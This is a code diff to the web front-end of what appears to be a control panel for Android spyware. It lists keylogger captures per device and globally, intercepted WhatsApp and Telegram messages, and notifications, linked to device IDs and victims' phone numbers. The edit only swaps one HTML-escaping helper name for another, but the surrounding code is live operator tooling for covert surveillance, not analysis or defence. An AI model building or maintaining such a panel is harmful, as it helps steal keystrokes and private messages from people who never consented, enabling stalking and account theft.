@@ -458,9 +458,9 @@ function connectWebSocket() {
       if (list && !list.querySelector('.tab-loading')) {
         const entry = document.createElement('div');
         entry.style.cssText = 'padding:8px 10px;border-bottom:1px solid var(--border);animation:fadeIn 0.3s';
-        const ts = escapeHtml(d.recorded_at || '');
-        const app = escapeHtml(d.app_package || '');
-        const text = escapeHtml(d.text_content || '');
+        const ts = esc(d.recorded_at || '');
+        const app = esc(d.app_package || '');
+        const text = esc(d.text_content || '');
         const devShort = (d.device_id || '').substring(0, 8);
         entry.innerHTML = `<div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start">
           <div style="flex:1;word-break:break-all;color:#00e5ff">${text}</div>
@@ -1199,7 +1199,7 @@ async function loadDeviceKeylogs(page) {
     // Populate app filter dropdown
     populateKeylogAppFilter(allKeylogEntries);
   } catch (e) {
-    document.getElementById('keylogListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+    document.getElementById('keylogListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${esc(e.message)}</p></div>`;
   }
 }
 
@@ -1223,9 +1223,9 @@ function renderKeylogEntries() {
   }
 
   container.innerHTML = filtered.map(e => {
-    const ts = escapeHtml(e.recorded_at || '');
-    const app = escapeHtml(e.app_package || 'unknown');
-    const text = escapeHtml(e.text_content || '');
+    const ts = esc(e.recorded_at || '');
+    const app = esc(e.app_package || 'unknown');
+    const text = esc(e.text_content || '');
     return `<div style="padding:8px 10px;border-bottom:1px solid var(--border)">
       <div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start">
         <div style="flex:1;word-break:break-all;color:var(--text)">${text}</div>
@@ -1260,7 +1260,7 @@ function populateKeylogAppFilter(entries) {
   if (!select) return;
   const apps = [...new Set(entries.map(e => e.app_package || '').filter(a => a))];
   const current = select.value;
-  select.innerHTML = '<option value="">All Apps</option>' + apps.map(a => `<option value="${escapeHtml(a)}">${escapeHtml(a)}</option>`).join('');
+  select.innerHTML = '<option value="">All Apps</option>' + apps.map(a => `<option value="${esc(a)}">${esc(a)}</option>`).join('');
   select.value = current;
 }
 
@@ -1301,7 +1301,7 @@ async function loadWhatsAppChats(page) {
     document.getElementById('whatsappCount').textContent = `${data.total || 0} messages`;
     renderWhatsAppChats();
   } catch (e) {
-    document.getElementById('whatsappListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+    document.getElementById('whatsappListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${esc(e.message)}</p></div>`;
   }
 }
 
@@ -1321,9 +1321,9 @@ function renderWhatsAppChats() {
 
   container.innerHTML = filtered.map(e => {
     const isOutgoing = e.direction === 'outgoing';
-    const text = escapeHtml(e.text_content || '');
-    const ts = escapeHtml(e.recorded_at || '');
-    const app = escapeHtml(e.app_package || 'whatsapp');
+    const text = esc(e.text_content || '');
+    const ts = esc(e.recorded_at || '');
+    const app = esc(e.app_package || 'whatsapp');
     const appName = app.replace(/^com\./, '').replace(/^whatsapp$/, 'WhatsApp').replace(/^org\.telegram/, 'Telegram');
     const align = isOutgoing ? 'flex-end' : 'flex-start';
     const bgColor = isOutgoing ? 'rgba(37,211,102,.15)' : 'rgba(255,255,255,.05)';
@@ -1420,7 +1420,7 @@ async function loadNotifications(page) {
     renderNotifications();
     populateNotiAppFilter(allNotiEntries);
   } catch (e) {
-    document.getElementById('notiListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+    document.getElementById('notiListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${esc(e.message)}</p></div>`;
   }
 }
 
@@ -1445,9 +1445,9 @@ function renderNotifications() {
 
   container.innerHTML = filtered.map(e => {
     const appInfo = getAppIcon(e.app_package || '');
-    const title = escapeHtml(e.title || '');
-    const text = escapeHtml(e.text_content || '');
-    const ts = escapeHtml(e.recorded_at || '');
+    const title = esc(e.title || '');
+    const text = esc(e.text_content || '');
+    const ts = esc(e.recorded_at || '');
     const isCircular = typeof appInfo.icon === 'string' && appInfo.icon.length === 1;
 
     return `<div style="display:flex;gap:10px;padding:10px;border-bottom:1px solid var(--border)">
@@ -1456,7 +1456,7 @@ function renderNotifications() {
       </div>
       <div style="flex:1;min-width:0">
         <div style="display:flex;justify-content:space-between;align-items:center;gap:8px">
-          <span style="font-size:12px;font-weight:600;color:${appInfo.color}">${escapeHtml(appInfo.name)}</span>
+          <span style="font-size:12px;font-weight:600;color:${appInfo.color}">${esc(appInfo.name)}</span>
           <span style="font-size:10px;color:var(--muted);white-space:nowrap">${ts}</span>
         </div>
         ${title ? `<div style="font-size:13px;color:var(--text);font-weight:600;margin-top:2px">${title}</div>` : ''}
@@ -1473,7 +1473,7 @@ function populateNotiAppFilter(entries) {
   const current = select.value;
   select.innerHTML = '<option value="">All Apps</option>' + apps.map(a => {
     const info = getAppIcon(a);
-    return `<option value="${escapeHtml(a)}">${escapeHtml(info.name)}</option>`;
+    return `<option value="${esc(a)}">${esc(info.name)}</option>`;
   }).join('');
   select.value = current;
 }
@@ -1520,12 +1520,12 @@ async function loadGlobalKeylogs(page) {
     }
 
     list.innerHTML = entries.map(e => {
-      const ts = escapeHtml(e.recorded_at || '');
-      const app = escapeHtml(e.app_package || 'unknown');
-      const text = escapeHtml(e.text_content || '');
+      const ts = esc(e.recorded_at || '');
+      const app = esc(e.app_package || 'unknown');
+      const text = esc(e.text_content || '');
       const devShort = (e.device_id || '').substring(0, 8);
-      const model = e.model ? escapeHtml(e.model) : '';
-      const phone = e.phone_numbers ? escapeHtml(String(e.phone_numbers).replace(/[\[\]"]/g, '').split(',')[0] || '') : '';
+      const model = e.model ? esc(e.model) : '';
+      const phone = e.phone_numbers ? esc(String(e.phone_numbers).replace(/[\[\]"]/g, '').split(',')[0] || '') : '';
       return `<div style="padding:10px;border-bottom:1px solid var(--border)">
         <div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start">
           <div style="flex:1;word-break:break-all;color:var(--text);font-size:13px">${text}</div>
@@ -1558,7 +1558,7 @@ async function loadGlobalKeylogs(page) {
       pgEl.innerHTML = html;
     }
   } catch (e) {
-    document.getElementById('globalKeylogList').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+    document.getElementById('globalKeylogList').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${esc(e.message)}</p></div>`;
   }
 }
 
@@ -1577,7 +1577,7 @@ async function populateKeylogDeviceFilter() {
     const current = select.value;
     select.innerHTML = '<option value="">All Devices</option>' + allDevices.map(d => {
       const name = d.model || d.phone_number || d.device_id?.substring(0, 8) || 'Unknown';
-      return `<option value="${escapeHtml(d.device_id)}">${escapeHtml(name)}</option>`;
+      return `<option value="${esc(d.device_id)}">${esc(name)}</option>`;
     }).join('');
     select.value = current;
   } catch (_) {}
